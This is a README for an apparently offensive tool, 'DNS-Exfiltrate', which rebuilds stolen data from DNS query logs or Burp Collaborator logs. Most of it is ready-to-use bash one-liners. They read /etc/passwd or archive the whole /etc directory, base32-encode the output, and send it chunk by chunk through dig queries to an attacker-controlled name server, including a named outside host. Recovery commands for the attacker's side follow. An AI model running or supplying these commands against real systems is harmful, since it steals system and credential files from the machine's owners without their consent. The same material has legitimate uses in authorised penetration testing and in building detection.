# DNS-Exfiltrate

Parses bind query logs or private Burp Collaborator output to exfiltrate data. Note that you will get more reliable results by specifying the name server via `dig @`...

It parses native bind query logs, or private Burp Collaborator output, which may be logged via `tee`:

```
java -jar /root/collaborator/burpsuite_pro.jar --collaborator-server | tee /root/collaborator/collaborator.log
```

Assumes logs are encoded in `base32` (`A-Z`, `2-7`), which most efficent DNS-safe utility. The `=` is not DNS safe, but can be trimmed using `tr -d =` on Linux/Unix systems.

Hex encoding also works (and I may add hex support in the future). `base64` does not work due to `/` and `+`.


Use cases (bash):

## Exfiltrate a file:

```
cat /etc/passwd | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover the file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d
```

To recover the file (on a private Burp Collaborator server):

```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d
```

## Exfiltrate a compressed file:

```
cat /etc/passwd | gzip - | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover/unzip the file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d | zcat
```

To recover/unzip the file (on a private Burp Collaborator server):

  ```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d | zcat 
```

## Exfiltrate a compressed tar archive of a directory:

```
tar czf - /etc | base32 -w 63 |tr -d =| while read a; do dig @ns1.eej.me $a.e.ns1.eej.me; done;
```
